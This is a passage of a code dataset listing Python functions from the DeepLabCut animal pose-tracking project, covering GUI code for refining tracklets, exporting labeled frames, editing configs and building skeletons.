                self.cuts = []
                for line in self.ax_slider.lines:
                    line.remove()
    elif event.key == 'backspace':
        if not self.dps:
            try:
                self.cuts.pop()
                self.ax_slider.lines.pop()
                if not len(self.cuts) == 2:
                    self.clean_collections()
            except IndexError:
                pass
        else:
            i = np.nanargmin([self.calc_distance(*dp.point.center, event.xdata, event.ydata) for dp in self.dps])
            closest_dp = self.dps[i]
            label = (closest_dp.individual_names, closest_dp.bodyParts)
            closest_dp.disconnect()
            closest_dp.point.remove()
            self.dps.remove(closest_dp)
            ind = self.manager._label_pairs.index(label)
            self.manager.xy[ind, self._curr_frame] = np.nan
            self.manager.prob[ind, self._curr_frame] = np.nan
        self.fig.canvas.draw_idle()
    elif event.key == 'l':
        self.lasso_toggle.set_active(not self.lasso_toggle.get_active)
    elif event.key == 'd':
        self.drag_toggle.set_active(not self.drag_toggle.get_active)
    elif event.key == 'alt+right':
        self.player.forward()
    elif event.key == 'alt+left':
        self.player.rewind()
    elif event.key == ' ' or event.key == 'tab':
        self.player.toggle()"
AlexEMG/DeepLabCut,move_forward,"def move_forward(self):
    if self.curr_frame < self.manager.nframes - 1:
        self.curr_frame += 1
        self.slider.set_val(self.curr_frame)"
AlexEMG/DeepLabCut,move_backward,"def move_backward(self):
    if self.curr_frame > 0:
        self.curr_frame -= 1
        self.slider.set_val(self.curr_frame)"
AlexEMG/DeepLabCut,swap,"def swap(self):
    if self.picked_pair:
        swap_inds = self.manager.get_swap_indices(*self.picked_pair)
        inds = np.insert(swap_inds, [0, len(swap_inds)], [0, self.manager.nframes - 1])
        if len(inds):
            ind = np.argmax(inds > self.curr_frame)
            self.manager.swap_tracklets(*self.picked_pair, range(inds[ind - 1], inds[ind] + 1))
            self.display_traces()
            self.slider.set_val(self.curr_frame)"
AlexEMG/DeepLabCut,invert,"def invert(self):
    if not self.picked_pair and len(self.picked) == 2:
        self.picked_pair = self.picked
    if self.picked_pair:
        self.manager.swap_tracklets(*self.picked_pair, [self.curr_frame])
        self.display_traces()
        self.slider.set_val(self.curr_frame)"
AlexEMG/DeepLabCut,on_pick,"def on_pick(self, event):
    artist = event.artist
    if artist.axes == self.ax1:
        self.picked = list(event.ind)
    elif artist.axes == self.ax2:
        if isinstance(artist, plt.Line2D):
            self.picked = [self.lines_x.index(artist)]
    elif artist.axes == self.ax3:
        if isinstance(artist, plt.Line2D):
            self.picked = [self.lines_y.index(artist)]
    elif self.picked:
        num_individual = self.leg.get_lines().index(artist)
        nrow = self.manager.tracklet2id.index(num_individual)
        inds = [nrow + self.manager.to_num_bodypart(pick) for pick in self.picked]
        xy = self.manager.xy[self.picked]
        p = self.manager.prob[self.picked]
        mask = np.zeros(xy.shape[1], dtype=bool)
        if len(self.cuts) > 1:
            mask[self.cuts[-2]:self.cuts[-1] + 1] = True
            self.cuts = []
            for line in self.ax_slider.lines:
                line.remove()
            self.clean_collections()
        else:
            return
        sl_inds = np.ix_(inds, mask)
        sl_picks = np.ix_(self.picked, mask)
        old_xy = self.manager.xy[sl_inds].copy()
        old_prob = self.manager.prob[sl_inds].copy()
        self.manager.xy[sl_inds] = xy[:, mask]
        self.manager.prob[sl_inds] = p[:, mask]
        self.manager.xy[sl_picks] = old_xy
        self.manager.prob[sl_picks] = old_prob
    self.picked_pair = []
    if len(self.picked) == 1:
        for pair in self.manager.swapping_pairs:
            if self.picked[0] in pair:
                self.picked_pair = pair
                break
    self.clean_collections()
    self.display_traces()
    if self.picked_pair:
        self.fill_shaded_areas()
    self.slider.set_val(self.curr_frame)"
AlexEMG/DeepLabCut,on_click,"def on_click(self, event):
    if event.inaxes in (self.ax2, self.ax3) and event.button == 1 and (not any((line.contains(event)[0] for line in self.lines_x + self.lines_y))):
        x = max(0, min(event.xdata, self.manager.nframes - 1))
        self.update_vlines(x)
        self.slider.set_val(x)
    elif event.inaxes == self.ax1 and (not self.scat.contains(event)[0]):
        self.display_traces(only_picked=False)
        self.clean_collections()"
AlexEMG/DeepLabCut,clean_collections,"def clean_collections(self):
    for coll in self.ax2.collections + self.ax3.collections + self.ax_slider.collections:
        coll.remove()"
AlexEMG/DeepLabCut,display_points,"def display_points(self, val):
    data = self.manager.xy[:, val]
    self.scat.set_offsets(data)"
AlexEMG/DeepLabCut,display_trails,"def display_trails(self, val):
    sl = slice(val - self.trail_len // 2, val + self.trail_len // 2)
    for (n, trail) in enumerate(self.trails):
        if n in self.picked:
            xy = self.manager.xy[n, sl]
            trail.set_data(*xy.T)
        else:
            trail.set_data([], [])"
AlexEMG/DeepLabCut,display_traces,"def display_traces(self, only_picked=True):
    if only_picked:
        inds = self.picked + list(self.picked_pair)
    else:
        inds = self.manager.swapping_bodyparts
    for (n, (line_x, line_y)) in enumerate(zip(self.lines_x, self.lines_y)):
        if n in inds:
            line_x.set_data(self.manager.times, self.manager.xy[n, :, 0])
            line_y.set_data(self.manager.times, self.manager.xy[n, :, 1])
        else:
            line_x.set_data([], [])
            line_y.set_data([], [])
    for ax in (self.ax2, self.ax3):
        ax.relim()
        ax.autoscale_view()"
AlexEMG/DeepLabCut,display_help,"def display_help(self, event):
    if not self.help_text:
        self.help_text = '\n            Key D: activate ""drag"" so you can adjust bodyparts in that particular frame\n            Key I: invert the position of a pair of bodyparts\n            Key L: toggle the lasso selector\n            Key S: swap two tracklets\n            Key X: cut swapping tracklets\n            Left/Right arrow OR Key B/Key N: navigate through the video (back/next)\n            Tab or SPACE: play/pause the video\n            Alt+Right/Left: fast forward/rewind - toggles through 5 speed levels\n            Backspace: deletes last flag (if set) or deletes point\n            Key P: toggles on pan/zoom tool - left button and drag to pan, right button and drag to zoom\n            '
        self.text = self.fig.text(0.5, 0.5, self.help_text, horizontalalignment='center', verticalalignment='center', fontsize=12, color='red')
    else:
        self.help_text = ''
        self.text.remove()"
AlexEMG/DeepLabCut,update_vlines,"def update_vlines(self, val):
    self.vline_x.set_xdata([val, val])
    self.vline_y.set_xdata([val, val])"
AlexEMG/DeepLabCut,on_change,"def on_change(self, val):
    self.mutex.lock()
    self.curr_frame = int(val)
    self.video.set_to_frame(self.curr_frame)
    img = self.video.read_frame()
    self.mutex.unlock()
    if img is not None:
        if self.draggable:
            self.drag_toggle.set_active(False)
        self.im.set_array(img)
        self.display_points(self.curr_frame)
        self.display_trails(self.curr_frame)
        self.update_vlines(self.curr_frame)"
AlexEMG/DeepLabCut,update_dotsize,"def update_dotsize(self, val):
    self.dotsize = val
    self.scat.set_sizes([self.dotsize ** 2])"
AlexEMG/DeepLabCut,calc_distance,"@staticmethod
def calc_distance(x1, y1, x2, y2):
    return np.sqrt((x1 - x2) ** 2 + (y1 - y2) ** 2)"
AlexEMG/DeepLabCut,save,"def save(self, *args):
    self.save_coords()
    self.manager.save()"
AlexEMG/DeepLabCut,export_to_training_data,"def export_to_training_data(self, pcutoff=0.1):
    import os
    from skimage import io
    inds = self.manager.find_edited_frames()
    if not len(inds):
        print('No frames have been manually edited.')
        return
    strwidth = int(np.ceil(np.log10(self.nframes)))
    tmpfolder = os.path.join(self.manager.cfg['project_path'], 'labeled-data', self.video.name)
    if os.path.isdir(tmpfolder):
        print('Frames from video', self.video.name, ' already extracted (more will be added)!')
    else:
        attempt_to_make_folder(tmpfolder)
    index = []
    for ind in inds:
        imagename = os.path.join(tmpfolder, 'img' + str(ind).zfill(strwidth) + '.png')
        index.append(tuple(os.path.join(*imagename.rsplit(os.path.sep, 3)[-3:]).split('\\')))
        if not os.path.isfile(imagename):
            self.video.set_to_frame(ind)
            frame = self.video.read_frame()
            if frame is None:
                print('Frame could not be read. Skipping...')
                continue
            frame = frame.astype(np.ubyte)
            if self.manager.cfg['cropping']:
                (x1, x2, y1, y2) = [int(self.manager.cfg[key]) for key in ('x1', 'x2', 'y1', 'y2')]
                frame = frame[y1:y2, x1:x2]
            io.imsave(imagename, frame)
    data = self.manager.format_data()
    df = data.iloc[inds]

    def filter_low_prob(cols, prob):
        mask = cols.iloc[:, 2] < prob
        cols.loc[mask] = np.nan
        return cols
    df = df.groupby(level='bodyparts', axis=1, group_keys=False).apply(filter_low_prob, prob=pcutoff)
    df.index = pd.MultiIndex.from_tuples(index)
    machinefile = os.path.join(tmpfolder, 'machinelabels-iter' + str(self.manager.cfg['iteration']) + '.h5')
    if os.path.isfile(machinefile):
        df_old = pd.read_hdf(machinefile)
        df_joint = pd.concat([df_old, df])
        df_joint = df_joint[~df_joint.index.duplicated(keep='first')]
        df_joint.to_hdf(machinefile, key='df_with_missing', mode='w')
        df_joint.to_csv(os.path.join(tmpfolder, 'machinelabels.csv'))
    else:
        df.to_hdf(machinefile, key='df_with_missing', mode='w')
        df.to_csv(os.path.join(tmpfolder, 'machinelabels.csv'))
    df.columns = df.columns.set_levels([self.manager.cfg['scorer']], level='scorer')
    df.drop('likelihood', level='coords', axis=1, inplace=True)
    output_path = os.path.join(tmpfolder, f""CollectedData_{self.manager.cfg['scorer']}.h5"")
    if os.path.isfile(output_path):
        print('A training dataset file is already found for this video. The refined machine labels are merged to this data!')
        df_orig = pd.read_hdf(output_path)
        df_joint = pd.concat([df, df_orig])
        df_joint = df_joint[~df_joint.index.duplicated(keep='first')]
        df_joint.sort_index(inplace=True)
        df_joint.to_hdf(output_path, key='df_with_missing', mode='w')
        df_joint.to_csv(output_path.replace('h5', 'csv'))
    else:
        df.sort_index(inplace=True)
        df.to_hdf(output_path, key='df_with_missing', mode='w')
        df.to_csv(output_path.replace('h5', 'csv'))"
AlexEMG/DeepLabCut,filter_low_prob,"def filter_low_prob(cols, prob):
    mask = cols.iloc[:, 2] < prob
    cols.loc[mask] = np.nan
    return cols"
AlexEMG/DeepLabCut,move_to_separate_thread,"def move_to_separate_thread(func):
    thread = QtCore.QThread()
    worker = Worker(func)
    worker.finished.connect(worker.deleteLater)
    worker.moveToThread(thread)
    thread.started.connect(worker.run)

    def stop_thread():
        thread.quit()
        thread.wait()
    worker.finished.connect(stop_thread)
    return (worker, thread)"
AlexEMG/DeepLabCut,is_latest_deeplabcut_version,"def is_latest_deeplabcut_version():
    import json
    import urllib.request
    from deeplabcut import VERSION
    url = 'https://pypi.org/pypi/deeplabcut/json'
    contents = urllib.request.urlopen(url).read()
    latest_version = json.loads(contents)['info']['version']
    return (VERSION == latest_version, latest_version)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, func):
    super().__init__()
    self.func = func"
AlexEMG/DeepLabCut,run,"def run(self):
    self.func()
    self.finished.emit()"
AlexEMG/DeepLabCut,stop_thread,"def stop_thread():
    thread.quit()
    thread.wait()"
AlexEMG/DeepLabCut,launch_napari,"def launch_napari(files=None):
    viewer = napari.Viewer()
    for action in viewer.window.plugins_menu.actions():
        if 'deeplabcut' in action.text():
            action.trigger()
            break
    if files is not None:
        viewer.open(files, plugin='napari-deeplabcut')
    return viewer"
AlexEMG/DeepLabCut,__init__,"def __init__(self, parent, **kwargs):
    super().__init__(parent)
    self.figure = Figure()
    self.axes = self.figure.add_subplot(1, 1, 1)
    self.canvas = FigureCanvas(self.figure)
    self.orig_xlim = None
    self.orig_ylim = None
    layout = QtWidgets.QVBoxLayout(self)
    layout.addWidget(self.canvas)"
AlexEMG/DeepLabCut,getfigure,"def getfigure(self):
    """"""
        Returns the figure, axes and canvas
        """"""
    return (self.figure, self.axes, self.canvas)"
AlexEMG/DeepLabCut,resetView,"def resetView(self):
    self.axes.set_xlim(self.orig_xlim)
    self.axes.set_ylim(self.orig_ylim)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, parent=None):
    super(DragDropListView, self).__init__(parent)
    self.parent = parent
    self.setAcceptDrops(True)
    self.setDropIndicatorShown(True)
    self.setDragDropMode(QtWidgets.QAbstractItemView.InternalMove)
    self.model = QStandardItemModel(self)
    self.setModel(self.model)
    self._default_style = self.styleSheet()"
AlexEMG/DeepLabCut,items,"@property
def items(self):
    for i in range(self.model.rowCount()):
        yield self.model.item(i)"
AlexEMG/DeepLabCut,state,"@property
def state(self):
    tests = [item.checkState() == QtCore.Qt.Checked for item in self.items]
    n_checked = sum(tests)
    if all(tests):
        state = QtCore.Qt.Checked
    elif any(tests):
        state = QtCore.Qt.PartiallyChecked
    else:
        state = QtCore.Qt.Unchecked
    return (state, n_checked)"
AlexEMG/DeepLabCut,add_item,"def add_item(self, path):
    item = QStandardItem(path)
    item.setCheckable(True)
    item.setCheckState(QtCore.Qt.Checked)
    self.model.appendRow(item)"
AlexEMG/DeepLabCut,clear,"def clear(self):
    self.model.removeRows(0, self.model.rowCount())"
AlexEMG/DeepLabCut,dragEnterEvent,"def dragEnterEvent(self, event):
    if event.mimeData().hasUrls():
        event.accept()
    else:
        event.ignore()"
AlexEMG/DeepLabCut,dropEvent,"def dropEvent(self, event):
    for url in event.mimeData().urls():
        path = url.toLocalFile()
        if os.path.isfile(path):
            self.add_item(path)
        elif os.path.isdir(path):
            for (root, _, files) in os.walk(path):
                for file in files:
                    if not file.startswith('.'):
                        self.add_item(os.path.join(root, file))"
AlexEMG/DeepLabCut,__init__,"def __init__(self, items, parent=None):
    super(ItemSelectionFrame, self).__init__(parent)
    self.setFrameShape(self.Shape.StyledPanel)
    self.setLineWidth(0)
    self.select_box = QtWidgets.QCheckBox('Files')
    self.select_box.setChecked(True)
    self.select_box.stateChanged.connect(self.toggle_select)
    self.fancy_list = DragDropListView(self)
    self._model = self.fancy_list.model
    self._model.rowsInserted.connect(self.check_select_box)
    self._model.rowsRemoved.connect(self.check_select_box)
    self._model.itemChanged.connect(self.check_select_box)
    for item in items:
        self.fancy_list.add_item(item)
    self.layout = QtWidgets.QVBoxLayout(self)
    self.layout.addWidget(self.select_box)
    self.layout.addWidget(self.fancy_list)"
AlexEMG/DeepLabCut,selected_items,"@property
def selected_items(self):
    for item in self.fancy_list.items:
        if item.checkState() == QtCore.Qt.Checked:
            yield item.text()"
AlexEMG/DeepLabCut,check_select_box,"def check_select_box(self):
    (state, n_checked) = self.fancy_list.state
    if self.select_box.checkState() != state:
        self.select_box.blockSignals(True)
        self.select_box.setCheckState(state)
        self.select_box.blockSignals(False)
    string = 'file'
    if n_checked > 1:
        string += 's'
    self.select_box.setText(f'{n_checked} {string} selected')"
AlexEMG/DeepLabCut,toggle_select,"def toggle_select(self, state):
    state = QtCore.Qt.CheckState(state)
    if state == QtCore.Qt.PartiallyChecked:
        return
    for item in self.fancy_list.items:
        if item.checkState() != state:
            item.setCheckState(state)"
AlexEMG/DeepLabCut,set_message,"def set_message(self, msg):
    pass"
AlexEMG/DeepLabCut,release_zoom,"def release_zoom(self, event):
    super(NavigationToolbar, self).release_zoom(event)
    self.zoom()"
AlexEMG/DeepLabCut,__init__,"def __init__(self):
    self.queue = Queue()"
AlexEMG/DeepLabCut,write,"def write(self, text):
    if text != '\n':
        self.queue.put(text)"
AlexEMG/DeepLabCut,flush,"def flush(self):
    pass"
AlexEMG/DeepLabCut,__init__,"def __init__(self, queue):
    super(StreamReceiver, self).__init__()
    self.queue = queue"
AlexEMG/DeepLabCut,run,"def run(self):
    while True:
        text = self.queue.get()
        self.new_text.emit(text)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, text='', color='turquoise', parent=None):
    super(ClickableLabel, self).__init__(text, parent)
    self._default_style = self.styleSheet()
    self.color = color
    self.setStyleSheet(f'color: {self.color}')"
AlexEMG/DeepLabCut,mouseReleaseEvent,"def mouseReleaseEvent(self, event):
    self.signal.emit()"
AlexEMG/DeepLabCut,enterEvent,"def enterEvent(self, event):
    self.setCursor(QCursor(QtCore.Qt.PointingHandCursor))
    self.setStyleSheet(f'color: {self.color}')"
AlexEMG/DeepLabCut,leaveEvent,"def leaveEvent(self, event):
    self.unsetCursor()
    self.setStyleSheet(self._default_style)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, parent=None):
    super(ItemCreator, self).__init__(parent)
    self.parent = parent
    vbox = QtWidgets.QVBoxLayout(self)
    self.field1 = QtWidgets.QLineEdit(self)
    self.field1.setPlaceholderText('Parameter')
    self.field2 = QtWidgets.QLineEdit(self)
    self.field2.setPlaceholderText('Value')
    create_button = QtWidgets.QPushButton(self)
    create_button.setText('Create')
    create_button.clicked.connect(self.form_item)
    vbox.addWidget(self.field1)
    vbox.addWidget(self.field2)
    vbox.addWidget(create_button)
    self.show()"
AlexEMG/DeepLabCut,form_item,"def form_item(self):
    key = self.field1.text()
    value = self.field2.text()
    item = QtWidgets.QTreeWidgetItem([key, value])
    item.setFlags(item.flags() | QtCore.Qt.ItemIsEditable)
    self.created.emit(item)
    self.accept()"
AlexEMG/DeepLabCut,__init__,"def __init__(self, parent):
    super(ContextMenu, self).__init__(parent)
    self.parent = parent
    self.current_item = parent.tree.currentItem()
    insert = QAction('Insert', self)
    insert.triggered.connect(self.create_item)
    delete = QAction('Delete', self)
    delete.triggered.connect(parent.remove_items)
    self.addAction(insert)
    self.addAction(delete)
    if self.current_item.text(0) == 'project_path':
        fix_path = QAction('Fix Path', self)
        fix_path.triggered.connect(self.fix_path)
        self.addAction(fix_path)"
AlexEMG/DeepLabCut,create_item,"def create_item(self):
    creator = ItemCreator(self)
    creator.created.connect(self.parent.insert)"
AlexEMG/DeepLabCut,fix_path,"def fix_path(self):
    self.current_item.setText(1, os.path.split(self.parent.filename)[0])"
AlexEMG/DeepLabCut,createEditor,"def createEditor(self, parent, option, index):
    if index.column() != 0:
        return super(CustomDelegate, self).createEditor(parent, option, index)
    return None"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg, filename='', parent=None):
    super(DictViewer, self).__init__(parent)
    self.cfg = cfg
    self.filename = filename
    self.parent = parent
    self.tree = QtWidgets.QTreeWidget()
    self.tree.setItemDelegate(CustomDelegate())
    self.tree.setHeaderLabels(['Parameter', 'Value'])
    self.tree.header().setSectionResizeMode(QtWidgets.QHeaderView.ResizeToContents)
    self.tree.setSelectionMode(QtWidgets.QAbstractItemView.ExtendedSelection)
    self.tree.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectItems)
    self.tree.setAlternatingRowColors(True)
    self.tree.setSortingEnabled(False)
    self.tree.setHeaderHidden(False)
    self.tree.itemChanged.connect(self.edit_value)
    self.tree.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
    self.tree.customContextMenuRequested.connect(self.pop_context_menu)
    self.root = self.tree.invisibleRootItem()
    self.tree.addTopLevelItem(self.root)
    self.populate_tree(cfg, self.root)
    layout = QtWidgets.QHBoxLayout()
    layout.addWidget(self.tree)
    layout2 = QtWidgets.QVBoxLayout()
    layout2.addWidget(QtWidgets.QLabel(filename))
    layout2.addWidget(self.tree)
    self.setLayout(layout2)"
AlexEMG/DeepLabCut,pop_context_menu,"def pop_context_menu(self, point):
    index = self.tree.indexAt(point)
    if not index.isValid():
        return
    menu = ContextMenu(self)
    menu.exec_(self.tree.mapToGlobal(point))"
AlexEMG/DeepLabCut,get_position_in_parent,"def get_position_in_parent(self, item):
    parent = item.parent() or self.root
    index = parent.indexOfChild(item)
    return (index, parent)"
AlexEMG/DeepLabCut,insert,"def insert(self, item):
    current = self.tree.selectedItems()[0]
    (ind, parent) = self.get_position_in_parent(current)
    parent.insertChild(ind + 1, item)
    value = self.cast_to_right_type(item.text(1))
    if parent is self.root:
        self.set_value(self.cfg, [item.text(0)], value)
    else:
        (keys, _) = self.walk_recursively_to_root(current)
        self.set_value(self.cfg, keys, value, ind + 1)"
AlexEMG/DeepLabCut,remove,"def remove(self, item):
    (ind, parent) = self.get_position_in_parent(item)
    (keys, value) = self.walk_recursively_to_root(item)
    if item.parent() and item.childCount():
        keys = [keys[0], value]
    success = self.remove_key(self.cfg, keys, ind)
    if success:
        parent.removeChild(item)"
AlexEMG/DeepLabCut,remove_items,"def remove_items(self):
    for item in self.tree.selectedItems():
        self.remove(item)"
AlexEMG/DeepLabCut,cast_to_right_type,"@staticmethod
def cast_to_right_type(val):
    try:
        val = ast.literal_eval(val)
    except ValueError:
        pass
    except SyntaxError:
        if os.path.sep not in val:
            print('Consider removing leading zeros or spaces in the string.')
    return val"
AlexEMG/DeepLabCut,walk_recursively_to_root,"@staticmethod
def walk_recursively_to_root(item):
    vals = []
    while item is not None:
        for i in range(item.columnCount() - 1, -1, -1):
            vals.append(item.text(i))
        item = item.parent()
    (*keys, value) = vals[::-1]
    return (keys, value)"
AlexEMG/DeepLabCut,get_nested_key,"@staticmethod
def get_nested_key(cfg, keys):
    temp = cfg
    for key in keys[:-1]:
        try:
            temp = temp.setdefault(key, {})
        except AttributeError:
            temp = temp[int(key)]
    return temp"
AlexEMG/DeepLabCut,edit_value,"def edit_value(self, item):
    (keys, value) = self.walk_recursively_to_root(item)
    if 'crop' not in keys:
        value = self.cast_to_right_type(value)
    self.set_value(self.cfg, keys, value)"
AlexEMG/DeepLabCut,set_value,"def set_value(self, cfg, keys, value, ind=None):
    temp = self.get_nested_key(cfg, keys)
    try:
        temp[keys[-1]] = value
    except TypeError:
        if ind is None:
            temp[self.tree.currentIndex().row()] = value
        else:
            temp.insert(ind, value)"
AlexEMG/DeepLabCut,remove_key,"def remove_key(self, cfg, keys, ind=None):
    if not len(keys):
        return
    temp = self.get_nested_key(cfg, keys)
    try:
        temp.pop(keys[-1])
    except TypeError:
        if ind is None:
            ind = self.tree.currentIndex().row()
        temp.pop(ind)
    return True"
AlexEMG/DeepLabCut,populate_tree,"def populate_tree(self, data, tree_widget):
    if isinstance(data, dict):
        for (key, val) in data.items():
            self.add_row(key, val, tree_widget)
    elif isinstance(data, list):
        for (i, val) in enumerate(data):
            self.add_row(str(i), val, tree_widget)
    else:
        print('This should never be reached!')"
AlexEMG/DeepLabCut,add_row,"def add_row(self, key, val, tree_widget):
    if isinstance(val, dict) or isinstance(val, list):
        item = QtWidgets.QTreeWidgetItem([key])
        self.populate_tree(val, item)
    else:
        item = QtWidgets.QTreeWidgetItem([key, str(val)])
        item.setFlags(item.flags() | QtCore.Qt.ItemIsEditable)
    tree_widget.addChild(item)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, config, parent=None):
    super(ConfigEditor, self).__init__(parent)
    self.config = config
    if config.endswith('config.yaml'):
        self.read_func = auxiliaryfunctions.read_config
        self.write_func = auxiliaryfunctions.write_config
    else:
        self.read_func = auxiliaryfunctions.read_plainconfig
        self.write_func = auxiliaryfunctions.write_plainconfig
    self.cfg = self.read_func(config)
    self.parent = parent
    self.setWindowTitle('Configuration Editor')
    if parent is not None:
        self.setMinimumWidth(parent.screen_width // 2)
        self.setMinimumHeight(parent.screen_height // 2)
    self.viewer = DictViewer(self.cfg, config, self)
    self.save_button = QtWidgets.QPushButton('Save', self)
    self.save_button.setDefault(True)
    self.save_button.clicked.connect(self.accept)
    self.cancel_button = QtWidgets.QPushButton('Cancel', self)
    self.cancel_button.clicked.connect(self.close)
    vbox = QtWidgets.QVBoxLayout(self)
    vbox.addWidget(self.viewer)
    hbox = QtWidgets.QHBoxLayout()
    hbox.addWidget(self.save_button)
    hbox.addWidget(self.cancel_button)
    vbox.addLayout(hbox)"
AlexEMG/DeepLabCut,keyPressEvent,"def keyPressEvent(self, e):
    if e.key() == QtCore.Qt.Key_Escape:
        self.close()"
AlexEMG/DeepLabCut,accept,"def accept(self):
    self.write_func(self.config, self.cfg)
    super(ConfigEditor, self).accept()"
AlexEMG/DeepLabCut,__init__,"def __init__(self, video, parent=None):
    super(FrameCropper, self).__init__(parent)
    self.clip = VideoWriter(video)
    self.fig = Figure()
    self.ax = self.fig.add_subplot(111)
    self.ax_help = self.fig.add_axes([0.9, 0.2, 0.1, 0.1])
    self.ax_save = self.fig.add_axes([0.9, 0.1, 0.1, 0.1])
    self.crop_button = Button(self.ax_save, 'Crop')
    self.crop_button.on_clicked(self.validate_crop)
    self.help_button = Button(self.ax_help, 'Help')
    self.help_button.on_clicked(self.display_help)
    self.canvas = FigureCanvas(self.fig)
    layout = QtWidgets.QVBoxLayout(self)
    layout.addWidget(self.canvas)
    self.setLayout(layout)
    self.bbox = [0, 0, 0, 0]"
AlexEMG/DeepLabCut,draw_bbox,"def draw_bbox(self):
    frame = None
    while frame is None:
        frame = self.clip.read_frame()
    self.bbox[-2:] = (frame.shape[1], frame.shape[0])
    self.ax.imshow(frame[:, :, ::-1])
    self.rs = RectangleSelector(self.ax, self.line_select_callback, minspanx=5, minspany=5, interactive=True, spancoords='pixels')
    self.show()
    self.fig.canvas.start_event_loop(timeout=-1)
    return self.bbox"
AlexEMG/DeepLabCut,line_select_callback,"def line_select_callback(self, eclick, erelease):
    self.bbox[:2] = (int(eclick.xdata), int(eclick.ydata))
    self.bbox[2:] = (int(erelease.xdata), int(erelease.ydata))"
AlexEMG/DeepLabCut,validate_crop,"def validate_crop(self, *args):
    self.fig.canvas.stop_event_loop()
    self.close()"
AlexEMG/DeepLabCut,display_help,"def display_help(self, *args):
    print('1. Use left click to select the region of interest. A red box will be drawn around the selected region. \n\n2. Use the corner points to expand the box and center to move the box around the image. \n\n3. Click ')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, config_path, parent=None):
    super(SkeletonBuilder, self).__init__(parent)
    self.config_path = config_path
    self.cfg = auxiliaryfunctions.read_config(config_path)
    self.df = None
    found = False
    root = os.path.join(self.cfg['project_path'], 'labeled-data')
    for dir_ in os.listdir(root):
        folder = os.path.join(root, dir_)
        if os.path.isdir(folder) and (not any((folder.endswith(s) for s in ('cropped', 'labeled')))):
            self.df = pd.read_hdf(os.path.join(folder, f""CollectedData_{self.cfg['scorer']}.h5""))
            (row, col) = self.pick_labeled_frame()
            if 'individuals' in self.df.columns.names:
                self.df = self.df.xs(col, axis=1, level='individuals')
            self.xy = self.df.loc[row].values.reshape((-1, 2))
            missing = np.flatnonzero(np.isnan(self.xy).all(axis=1))
            if not missing.size:
                found = True
                break
    if self.df is None:
        raise IOError('No labeled data were found.')
    self.bpts = self.df.columns.get_level_values('bodyparts').unique()
    if not found:
        warnings.warn(f""A fully labeled animal could not be found. {', '.join(self.bpts[missing])} will need to be manually connected in the config.yaml."")
    self.tree = KDTree(self.xy)
    if isinstance(row, str):
        sep = '/' if '/' in row else '\\'
        row = row.split(sep)
    self.image = io.imread(os.path.join(self.cfg['project_path'], *row))
    self.inds = set()
    self.segs = set()
    if self.cfg['skeleton']:
        for bone in self.cfg['skeleton']:
            pair = np.flatnonzero(self.bpts.isin(bone))
            if len(pair) != 2:
                continue
            pair_sorted = tuple(sorted(pair))
            self.inds.add(pair_sorted)
            self.segs.add(tuple(map(tuple, self.xy[pair_sorted, :])))
    self.fig = Figure()
    self.ax = self.fig.add_subplot(111)
    self.ax.axis('off')
    ax_clear = self.fig.add_axes([0.85, 0.55, 0.1, 0.1])
    ax_export = self.fig.add_axes([0.85, 0.45, 0.1, 0.1])
    self.clear_button = Button(ax_clear, 'Clear')
    self.clear_button.on_clicked(self.clear)
    self.export_button = Button(ax_export, 'Export')
    self.export_button.on_clicked(self.export)
    self.fig.canvas.mpl_connect('pick_event', self.on_pick)
    self.canvas = FigureCanvas(self.fig)
    layout = QtWidgets.QVBoxLayout(self)
    layout.addWidget(self.canvas)
    self.setLayout(layout)
    self.lines = LineCollection(self.segs, colors=mcolors.to_rgba(self.cfg['skeleton_color']))
    self.lines.set_picker(True)
    self._show()"
AlexEMG/DeepLabCut,pick_labeled_frame,"def pick_labeled_frame(self):
    try:
        count = self.df.groupby(level='individuals', axis=1).count()
        if 'single' in count:
            count.drop('single', axis=1, inplace=True)
    except KeyError:
        count = self.df.count(axis=1).to_frame()
    mask = count.where(count == count.values.max())
    kept = mask.stack().index.to_list()
    np.random.shuffle(kept)
    picked = kept.pop()
    row = picked[:-1]
    col = picked[-1]
    return (row, col)"
AlexEMG/DeepLabCut,_show,"def _show(self):
    lo = np.nanmin(self.xy, axis=0)
    hi = np.nanmax(self.xy, axis=0)
    center = (hi + lo) / 2
    (w, h) = hi - lo
    ampl = 1.3
    w *= ampl
    h *= ampl
    self.ax.set_xlim(center[0] - w / 2, center[0] + w / 2)
    self.ax.set_ylim(center[1] - h / 2, center[1] + h / 2)
    self.ax.imshow(self.image)
    self.ax.scatter(*self.xy.T, s=self.cfg['dotsize'] ** 2)
    self.ax.add_collection(self.lines)
    self.ax.invert_yaxis()
    self.lasso = LassoSelector(self.ax, onselect=self.on_select)
    self.show()"
AlexEMG/DeepLabCut,clear,"def clear(self, *args):
    self.inds.clear()
    self.segs.clear()
    self.lines.set_segments(self.segs)"
AlexEMG/DeepLabCut,export,"def export(self, *args):
    inds_flat = set((ind for pair in self.inds for ind in pair))
    unconnected = [i for i in range(len(self.xy)) if i not in inds_flat]
    if len(unconnected):
        warnings.warn(f""You didn't connect all the bodyparts (which is fine!). This is just a note to let you know."")
    self.cfg['skeleton'] = [tuple(self.bpts[list(pair)]) for pair in self.inds]
    auxiliaryfunctions.write_config(self.config_path, self.cfg)"
AlexEMG/DeepLabCut,on_pick,"def on_pick(self, event):
    if event.mouseevent.button == 3:
        removed = event.artist.get_segments().pop(event.ind[0])
        self.segs.remove(tuple(map(tuple, removed)))
        self.inds.remove(tuple(self.tree.query(removed)[1]))"
AlexEMG/DeepLabCut,on_select,"def on_select(self, verts):
    self.path = Path(verts)
    self.verts = verts
    inds = self.tree.query_ball_point(verts, 5)
    inds_unique = []
    for lst in inds:
        if len(lst) and lst[0] not in inds_unique:
            inds_unique.append(lst[0])
    for pair in zip(inds_unique, inds_unique[1:]):
        pair_sorted = tuple(sorted(pair))
        self.inds.add(pair_sorted)
        self.segs.add(tuple(map(tuple, self.xy[pair_sorted, :])))
    self.lines.set_segments(self.segs)
    self.fig.canvas.draw_idle()"
AlexEMG/DeepLabCut,_check_for_updates,"def _check_for_updates():
    (is_latest, latest_version) = utils.is_latest_deeplabcut_version()
    (is_latest_plugin, latest_plugin_version) = misc.is_latest_version()
    if is_latest and is_latest_plugin:
